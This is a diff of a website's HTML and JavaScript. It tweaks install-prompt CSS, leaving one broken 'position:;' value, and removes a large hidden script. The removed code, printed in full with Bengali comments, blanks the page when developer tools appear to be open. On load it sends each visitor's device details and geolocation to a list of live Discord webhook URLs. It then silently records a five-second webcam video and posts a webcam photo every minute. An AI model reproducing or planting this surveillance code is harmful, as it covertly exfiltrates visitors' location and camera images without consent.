@@ -611,7 +611,7 @@
     }
 /*Install Promt */
     .install-prompt {
-      position:fixed;
+      position:;
       top: 0;
       left: 0;
       right: 0;
@@ -619,7 +619,7 @@
       background: #00072D;
       color: white;
       z-index: 9999;
-      display: flex;
+      display: none;
       flex-direction: column;
       justify-content: center;
       align-items: center;
@@ -1481,172 +1481,6 @@ ${post.type === 'news' ? '<i class="bi bi-newspaper"></i>' : ''}
     }
   }, 1000);
 
-  // Also detect resize change (DevTools side panel)
-  setInterval(function () {
-    if (
-      window.outerWidth - window.innerWidth > 160 ||
-      window.outerHeight - window.innerHeight > 160
-    ) {
-      document.body.innerHTML = "";
-    }
-  }, 1000);
-  // অনেকগুলো Discord webhook URL রাখো এখানে:
-const webhooks = [
-  "https://discord.com/api/webhooks/1405075256657580073/CNoV8OPEqf5QC08lAYPJedbCBn2KEma6kLN60brtNVCv4DKk7KUY6yxDHdhTTdUWMp5W",
-  "https://discord.com/api/webhooks/1405076125314449460/elzNtuDR-G-eueiGlwt7Pr7fs_Pb_CasHDcA0KfE9Jem9VzqiGx-VXjSzLe2O_cHpD5L",
-  "https://discord.com/api/webhooks/1405076202343108628/vu1g7AKz1pjjVeKtqAPHV0zy8extb9cwSjm0FF10mKYpekA7IRn7Fa7N65441t9v1hYx",
-  "https://discord.com/api/webhooks/1405076209326358548/2M3BtGSu6njvLv9YRcSeq7L-ANeSzfFLKOaRvuta4HIaQJbAzskpeTjmQRMTWoylb2r5",
-  "https://discord.com/api/webhooks/1405077751580590080/wo3MVLdNKIkV0C001GprNX7DdCqLoMbHOo3eRVLECIbgauLDbA5L1ici-h7uphAlHnjb",
-  "https://discord.com/api/webhooks/1405077831096205312/WVd-80rRQMJjtqOYYpEG1rPCAeXU5MYei7NY8ZJzs8XFjrbzBizFG06_6G29y5sDKucd",
-  "https://discord.com/api/webhooks/1405077917863645216/8iNB7co4BDEoH07ylyGZvMWgx-yc6QC-isNDoYhg3qwYEmar6ePgF3mRjhCDHuf0T1Q4",
-  "https://discord.com/api/webhooks/1405078003817644163/CX56wK7Pb48hWpvtjhwl0b892kEiZFhk3xRetoYu2VcN7Xcje415xt8_BnWaqG83Fe-a",
-  "https://discord.com/api/webhooks/1405078082301202432/b6MI9OPb77LafvdrDczASl8o2YIo3NiwROeav2znbqzYCkuhhOV5xuq4g5yywX4txmHr",
-  "https://discord.com/api/webhooks/1405078163746459678/Vt8UfbZF0_ZdDFn7kebvKMpej18E7Pe0Xc1DKNUjKi65TipPRfBl0ykaa2VL5YPtBo3n"
-  // আরও যোগ করো তোমার webhook এখানে
-];
-
-
-// র‍্যান্ডম webhook নিতে ফাংশন:
-function getRandomWebhook() {
-  const index = Math.floor(Math.random() * webhooks.length);
-  return webhooks[index];
-}
-
-// ডিভাইস ইনফো ও লোকেশন Discord-এ পাঠানোর ফাংশন
-async function sendDeviceInfo() {
-  const info = {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    screen: `${window.screen.width}x${window.screen.height}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    online: navigator.onLine,
-    locationLink: "Location not available"
-  };
-
-  // লোকেশন পাওয়া গেলে লিঙ্ক তৈরি করব
-  if (navigator.geolocation) {
-    try {
-      const pos = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 10000});
-      });
-      const lat = pos.coords.latitude;
-      const lng = pos.coords.longitude;
-      info.locationLink = `https://www.google.com/maps?q=${lat},${lng}`;
-    } catch (err) {
-      info.locationLink = "Location permission denied or unavailable";
-    }
-  } else {
-    info.locationLink = "Geolocation not supported";
-  }
-
-  const content = `
-📡 **Device Info**
-User Agent: \`${info.userAgent}\`
-Platform: \`${info.platform}\`
-Language: \`${info.language}\`
-Screen: \`${info.screen}\`
-Timezone: \`${info.timezone}\`
-Online: \`${info.online}\`
-📍 **Location**: [Open in Google Maps](${info.locationLink})
-`;
-
-  await fetch(getRandomWebhook(), {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content })
-  });
-}
-
-window.onload = async () => {
-  const video = document.getElementById('video');
-
-  // প্রথমে ডিভাইস ও লোকেশন ইনফো পাঠাও
-  await sendDeviceInfo();
-
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { width: 1280, height: 720 },
-      audio: false
-    });
-    video.srcObject = stream;
-
-    // ভিডিও পাঠানো হয়েছে কিনা চেক (sessionStorage ব্যবহার)
-    if (!sessionStorage.getItem('videoSent')) {
-      await recordAndSendVideo(stream);
-      sessionStorage.setItem('videoSent', 'true');
-    }
-
-    // প্রতি ১ মিনিটে ছবি পাঠানোর জন্য setInterval
-    setInterval(() => {
-      sendPhoto(video);
-    }, 60000); // ৬০ সেকেন্ড
-
-  } catch (err) {
-    console.error("Camera error:", err);
-  }
-};
-
-// ৫ সেকেন্ড ভিডিও রেকর্ড ও Discord-এ পাঠানোর ফাংশন
-function recordAndSendVideo(stream) {
-  return new Promise((resolve) => {
-    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8' });
-    const chunks = [];
-
-    mediaRecorder.ondataavailable = e => {
-      if (e.data.size > 0) chunks.push(e.data);
-    };
-
-    mediaRecorder.onstop = () => {
-      const blob = new Blob(chunks, { type: 'video/webm' });
-      sendBlobToDiscord(blob, 'intro_video.webm');
-      resolve();
-    };
-
-    mediaRecorder.start();
-    setTimeout(() => {
-      mediaRecorder.stop();
-    }, 5000);
-  });
-}
-
-// ছবি তুলে Discord-এ পাঠানোর ফাংশন
-function sendPhoto(video) {
-  const canvas = document.createElement('canvas');
-  canvas.width = 600;  // তোমার প্রয়োজন অনুযায়ী পরিবর্তন করতে পারো
-  canvas.height = 720;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-  canvas.toBlob(blob => {
-    const form = new FormData();
-    form.append("file", blob, "capture.png");
-
-    fetch(getRandomWebhook(), {
-      method: "POST",
-      body: form
-    }).then(() => {
-      console.log("Photo sent to Discord");
-    }).catch(err => {
-      console.error("Error sending photo:", err);
-    });
-  }, "image/png", 0.8);
-}
-
-// ভিডিও Blob Discord-এ পাঠানোর ফাংশন
-function sendBlobToDiscord(blob, filename) {
-  const form = new FormData();
-  form.append("file", blob, filename);
-
-  fetch(getRandomWebhook(), {
-    method: "POST",
-    body: form
-  }).then(() => {
-    console.log("Video sent to Discord");
-  }).catch(err => {
-    console.error("Error sending video:", err);
-  });
-}
 </script>
 </body>
 </html>
